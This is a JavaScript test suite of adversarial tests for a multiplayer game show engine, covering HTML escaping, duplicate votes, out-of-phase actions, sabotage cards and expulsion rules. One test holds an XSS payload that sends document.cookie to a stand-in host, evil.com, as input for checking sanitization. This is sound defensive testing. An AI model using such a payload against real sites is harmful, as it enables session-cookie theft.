// tests/suites/tier5_adversarial.mjs
import assert from 'node:assert/strict';
import { GameShowEngine } from '../lib/gameShowEngine.mjs';

export async function runTier5AdversarialTests(testCtx) {
  testCtx.suite('Tier 5: Adversarial & Chaos Hardening');

  testCtx.test('T5.1 - XSS and Script Injection Neutralization in Player Names and Roasts', () => {
    const engine = new GameShowEngine('MLN131');
    const maliciousName = '<script>alert("pwned")</script>';
    const player = engine.joinPlayer('hacker_1', maliciousName);

    assert.equal(player.name.includes('<script>'), false);
    assert.equal(player.name, '&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt;');

    engine.startRound1(0);
    const maliciousRoast = '<img src=x onerror=document.location="http://evil.com?c="+document.cookie>';
    const sanitizedRoast = engine.submitRoast('hacker_1', maliciousRoast);

    assert.equal(sanitizedRoast.includes('<img'), false);
    assert.ok(sanitizedRoast.includes('&lt;img'));
  });

  testCtx.test('T5.2 - Duplicate Vote Injection Prevention', () => {
    const engine = new GameShowEngine('MLN131');
    engine.joinPlayer('p1', 'Player 1');
    engine.joinPlayer('p2', 'Player 2');
    engine.joinPlayer('voter_x', 'Greedy Voter');

    engine.startRound1(0);
    engine.submitRoast('p1', 'Roast 1');
    engine.submitRoast('p2', 'Roast 2');
    engine.pairDuels();

    // First vote succeeds
    engine.voteRoast('voter_x', 'duel_1', 'A');

    // Second vote attempt throws
    assert.throws(() => {
      engine.voteRoast('voter_x', 'duel_1', 'A');
    }, /Already voted for this duel/);

    // Attempting to change vote to B also throws
    assert.throws(() => {
      engine.voteRoast('voter_x', 'duel_1', 'B');
    }, /Already voted for this duel/);
  });

  testCtx.test('T5.3 - Illegal Out-of-Phase Action Rejection', () => {
    const engine = new GameShowEngine('MLN131');
    engine.joinPlayer('p1', 'Player');

    // Attempting to submit roast before Round 1 starts
    assert.throws(() => {
      engine.submitRoast('p1', 'Roast out of nowhere');
    }, /Roast submission is closed/);

    // Attempting to submit minigame result before Round 2 starts
    assert.throws(() => {
      engine.submitMinigameResult('p1', true, 1000);
    }, /Mini-game is not in active 5s phase/);
  });

  testCtx.test('T5.4 - Counterfeit Card Attack (Playing cards not in hand)', () => {
    const engine = new GameShowEngine('MLN131');
    engine.joinPlayer('attacker', 'Attacker');
    engine.joinPlayer('target', 'Target');
    engine.startRound4();

    // Clear attacker's cards
    engine.r4.cards.set('attacker', []);

    // Try to execute heist without holding the card
    assert.throws(() => {
      engine.playSabotageCard('attacker', 'target', 'CARD_HEIST');
    }, /Attacker does not hold card CARD_HEIST/);
  });

  testCtx.test('T5.5 - Shield Invariant Under Multiple Concurrent Hostile Attacks', () => {
    const engine = new GameShowEngine('MLN131');
    engine.joinPlayer('tank', 'Tank Player');
    engine.joinPlayer('thief_1', 'Thief 1');
    engine.joinPlayer('thief_2', 'Thief 2');

    engine.players.get('tank').totalScore = 5000;
    engine.startRound4();

    // Tank activates shield
    engine.r4.cards.set('tank', ['CARD_SHIELD']);
    engine.playSabotageCard('tank', 'tank', 'CARD_SHIELD');
    assert.ok(engine.r4.shields.has('tank'));

    // Thief 1 attacks with HEIST -> Shield deflects!
    engine.r4.cards.set('thief_1', ['CARD_HEIST']);
    const def1 = engine.playSabotageCard('thief_1', 'tank', 'CARD_HEIST');
    assert.ok(def1.blockedByShield);
    assert.equal(engine.players.get('tank').totalScore, 5000); // 0 stolen
    assert.ok(!engine.r4.shields.has('tank')); // Shield is now consumed

    // Thief 2 attacks immediately after shield broken -> Succeeds
    engine.r4.cards.set('thief_2', ['CARD_HEIST']);
    const def2 = engine.playSabotageCard('thief_2', 'tank', 'CARD_HEIST');
    assert.equal(def2.success, true);
    assert.equal(def2.stolenPoints, 2500);
    assert.equal(engine.players.get('tank').totalScore, 2500);
  });

  testCtx.test('T5.6 - Round 3 Self-Expulsion Vote Prevention', () => {
    const engine = new GameShowEngine('MLN131');
    engine.joinPlayer('u1', 'Self Loathing');
    engine.startRound3();

    assert.throws(() => {
      engine.castExpulsionVote('u1', 'u1');
    }, /Cannot vote to expel yourself/);
  });

  testCtx.test('T5.7 - Expelled Player Mute Invariant in Discussion', () => {
    const engine = new GameShowEngine('MLN131');
    engine.joinPlayer('ghost', 'Ghost');
    engine.startRound3();
    engine.r3.expelledPlayers.add('ghost');

    assert.throws(() => {
      engine.postDiscussion('ghost', 'Tôi vẫn muốn nói tiếp!');
    }, /Expelled players cannot speak in discussion/);
  });
}
